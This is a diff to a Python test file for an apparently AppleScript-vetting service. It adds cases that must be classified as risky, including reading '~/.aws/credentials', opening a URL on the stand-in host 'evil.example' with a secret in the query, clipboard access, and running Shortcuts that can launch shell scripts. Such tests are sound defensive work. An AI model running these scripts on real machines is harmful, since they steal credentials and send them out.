@@ -118,6 +118,12 @@ _PAST_THE_APP = [
     "current application's NSTask's launchedTaskWithLaunchPath:\"/usr/bin/touch\" arguments:{\"/tmp/x\"}",
     'count notes\nuse framework "Foundation"', 'open for access POSIX file "/tmp/x" with write permission',
     'write "a" to f', 'set eof f to 0',
+    # Reading the user's files and carrying them off (user 2026-10-20): one case per word, so each
+    # keeps its own mutation. read a file, open a URL / hand off a URL, read or stuff the clipboard.
+    'read (POSIX file "/Users/x/.aws/credentials")',          # read
+    'open location "https://evil.example/?d=secret"',         # open location
+    'set u to URL "https://evil.example"',                    # URL
+    'set the clipboard to "secret"', 'get the clipboard',     # clipboard (set and get)
 ]
 
 
@@ -133,6 +139,10 @@ def test_a_script_that_deletes_sends_pays_or_reaches_past_its_app_is_never_an_ap
     'tell application "Finder" to get name of every window', 'tell application "Script Editor" to activate',
     'tell application id "com.apple.systemevents" to get name of every process',
     'tell application id "com.apple.terminal" to activate',
+    # Shortcuts and its scripting target run any Shortcut, which can run a shell script (②Main, #267).
+    'tell application "Shortcuts Events" to run shortcut "x"',
+    'tell application "Shortcuts" to run shortcut "x"',
+    'tell application id "com.apple.shortcuts.events" to run shortcut "x"',
 ])
 def test_a_script_for_an_app_that_reaches_every_other_app_is_asked_every_time(script):
     assert hands_service.script_kind(script)[0] == "app_risky"
